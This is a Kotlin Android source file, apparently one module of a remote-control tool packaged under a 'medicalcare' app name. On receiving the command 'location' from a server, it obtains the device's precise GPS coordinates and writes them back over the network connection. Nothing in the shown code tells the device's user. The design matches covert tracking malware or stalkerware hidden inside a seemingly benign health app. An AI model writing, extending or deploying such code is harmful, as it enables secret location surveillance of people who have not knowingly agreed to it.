package com.example.medicalcare.features.network.commands

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.Tasks
import com.google.android.gms.tasks.CancellationTokenSource
import java.util.concurrent.TimeUnit
import java.io.DataOutputStream

class LocationReader(private val context: Context) : CommandHandler {
    override fun handle(command: String, toServer: DataOutputStream) {
        if (!command.equals("location", ignoreCase = true)) return

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            toServer.write("[!] Location permission not granted. Grant ACCESS_FINE_LOCATION in app settings or run app and allow permission.\n".toByteArray())
            toServer.flush()
            return
        }

        val fused = LocationServices.getFusedLocationProviderClient(context)
        try {
            // Try to get a fresh, high-accuracy current location first
            val cts = CancellationTokenSource()
            val currentTask = try {
                fused.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, cts.token)
            } catch (e: NoSuchMethodError) {
                // Fallback for older Play services: use lastLocation
                Log.w("LocationReader", "getCurrentLocation not available, falling back to lastLocation")
                fused.lastLocation
            }

            val location = try {
                Tasks.await(currentTask, 6, TimeUnit.SECONDS)
            } catch (te: Exception) {
                Log.w("LocationReader", "getCurrentLocation timed out or failed", te)
                null
            }

            // If still null, try lastLocation as a fallback
            val finalLocation = if (location == null) {
                try {
                    Tasks.await(fused.lastLocation, 4, TimeUnit.SECONDS)
                } catch (te: Exception) {
                    Log.w("LocationReader", "lastLocation await timed out or failed", te)
                    null
                }
            } else {
                location
            }

            try {
                if (finalLocation != null) {
                    val out = buildString {
                        appendLine("--------------------------------------------")
                        appendLine("Latitude: ${finalLocation.latitude}")
                        appendLine("Longitude: ${finalLocation.longitude}")
                        appendLine("Accuracy: ${finalLocation.accuracy}")
                        appendLine("Provider: ${finalLocation.provider}")
                        appendLine("--------------------------------------------")
                    }
                    toServer.write(out.toByteArray())
                } else {
                    toServer.write("[!] No location available or requests timed out. Ensure location services and emulator/provider are configured.\n".toByteArray())
                }
                toServer.flush()
            } catch (e: Exception) {
                Log.e("LocationReader", "Error writing location to server", e)
            }
        } catch (e: Exception) {
            Log.e("LocationReader", "Exception while requesting location", e)
            toServer.write("[!] Location error: ${e.message}\n".toByteArray())
            toServer.flush()
        }
    }
}
